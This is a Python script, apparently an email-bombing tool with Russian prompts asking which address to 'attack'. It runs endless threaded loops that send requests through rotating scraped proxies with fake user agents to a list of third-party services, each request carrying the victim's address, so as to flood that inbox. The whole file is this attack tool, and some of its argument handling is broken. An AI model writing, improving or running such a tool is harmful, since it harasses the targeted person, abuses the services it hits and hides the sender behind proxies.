from argparse import ArgumentParser
from urllib.request import Request, urlopen
from urllib.error import URLError
from proxyscanio import ProxyScanIO
from random import choice
from fake_useragent import UserAgent
from servises import SERVS
from threading import Thread

ps = ProxyScanIO()
ua = UserAgent()
email = ''
thr = 0

parser = ArgumentParser()
parser.add_argument('--email', help='Email to attack', type=str)
parser.add_argument('--thr', help='How many theard use', type=int)
args = parser.parse_args()
if args.email and args.thr:
    url = args.email
    thr = args.thr
elif args.email:
    url = args.email
    thr = int(input('Сколько использовать потоков?: '))
elif args.thr:
    thr = args.thr
    url = input('Какой Email атаковать?: ')
else:
    while not email or not thr:
        email = input('Какой Email атаковать?: ')
        thr = input('Сколько использовать потоков? (10): ')
        if not thr:
            thr = 10


def SendQuery():
    while 1:
        proxies = ps.Get_Proxies(
            type='HTTP,HTTPS', level='Elite,Transparent', ping=500, count=20)
        for serv in SERVS:
            url = serv % email
            servNick = serv.split('/')[2]
            head = {'User-Agent': ua.random}
            try:
                proxy_host = choice(proxies)
                req = Request(url, headers=head)
                req.set_proxy(proxy_host, 'http')
                resp = urlopen(req)
                code = resp.getcode()
                print(code, 'Запрос отправлен с IP:',
                      proxy_host, 'На сервис:', servNick)
            except Exception as err:
                if err is URLError:
                    SERVS.remove(serv)
                    print('Сервис', servNick, 'удалён.')


for _ in range(int(thr)):
    t = Thread(target=SendQuery)
    t.start()
